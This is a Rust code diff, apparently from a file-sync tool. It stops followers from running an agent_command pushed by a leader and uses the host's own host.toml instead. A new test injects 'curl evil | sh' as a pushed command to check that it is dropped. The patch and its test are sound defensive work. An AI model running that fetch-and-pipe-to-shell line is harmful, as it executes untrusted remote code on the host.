@@ -1186,6 +1186,10 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
             format!("{entry}:{alpha}")
         }
     };
+    let host = match directory.parent() {
+        Some(state_root) => crate::host::HostSettings::load(state_root)?,
+        None => crate::host::HostSettings::default(),
+    };
     let mut position: Option<usize> = None;
     let mut leader: Option<String> = None;
     let mut groups = std::collections::BTreeMap::new();
@@ -1219,11 +1223,8 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
             .unwrap_or_else(|| name.to_owned());
         // The leader names this host's own root in the pushed name; what
         // this host lets be synced is its own to say.
-        if let Some(state_root) = directory.parent() {
-            crate::host::HostSettings::load(state_root)?
-                .check_root(&crate::paths::expand_tilde(&own_path)?)
-                .with_context(|| format!("group {group_name}: the pushed name {name:?}"))?;
-        }
+        host.check_root(&crate::paths::expand_tilde(&own_path)?)
+            .with_context(|| format!("group {group_name}: the pushed name {name:?}"))?;
         // The other betas as they were, and the configured alpha as a
         // beta spec reached by attachment — so the star is never empty,
         // and the attached plan gets every setting the group carries.
@@ -1236,9 +1237,13 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
             .map(|(_, entry)| full(entry, &group.alpha))
             .collect();
         betas.push(format!("{}:{}", attached_destination(ALPHA), group.alpha));
+        // The command that reaches the other betas is this host's to
+        // choose: a pushed one would run here at takeover, chosen by a
+        // leader that may be long gone. Its own `host.toml` says, or ssh.
         let mut turned = crate::config::Group {
             alpha: own_path,
             betas,
+            agent_command: host.agent_command().map(str::to_owned),
             ..group.clone()
         };
         // The mode spelling is kept as written, so the plans say
@@ -1417,6 +1422,45 @@ mod star_tests {
             "{message}"
         );
         derive_star(PUSHED, "box2:/srv/ws", &directory).expect("inside /srv");
+    }
+
+    /// A follower never runs a command its leader pushed: a pushed
+    /// `agent_command` is dropped from every group it derives, and its own
+    /// `host.toml` says how it reaches the other betas, if it says at all.
+    #[test]
+    fn a_pushed_agent_command_is_never_run() {
+        let keep = tempfile::tempdir().expect("tempdir");
+        let state = keep.path().join("state");
+        let directory = state.join(DIRECTORY);
+        std::fs::create_dir_all(&directory).unwrap();
+        let pushed = PUSHED.replace(
+            "ignores = [\"target\"]",
+            "ignores = [\"target\"]\nagent_command = \"curl evil | sh\"",
+        );
+        let command_of = |star: &FollowerStar| match &star.plans[0].beta {
+            crate::config::EndpointTarget::Remote { agent_command, .. } => agent_command.clone(),
+            other => panic!("a remote beta: {other:?}"),
+        };
+        let name = "ubuntu@vm:/home/faraz/Workspace/Voltai";
+        let star = derive_star(&pushed, name, &directory).expect("a star");
+        assert_eq!(command_of(&star), None);
+
+        std::fs::write(
+            state.join(crate::host::FILE),
+            "agent_command = \"ssh -F /etc/peering autobahn agent\"\n",
+        )
+        .unwrap();
+        let star = derive_star(&pushed, name, &directory).expect("a star");
+        assert_eq!(
+            command_of(&star),
+            Some(vec![
+                "ssh".to_owned(),
+                "-F".to_owned(),
+                "/etc/peering".to_owned(),
+                "autobahn".to_owned(),
+                "agent".to_owned()
+            ])
+        );
     }
 
     /// Two groups reach one host at two roots. Each pushes its own name
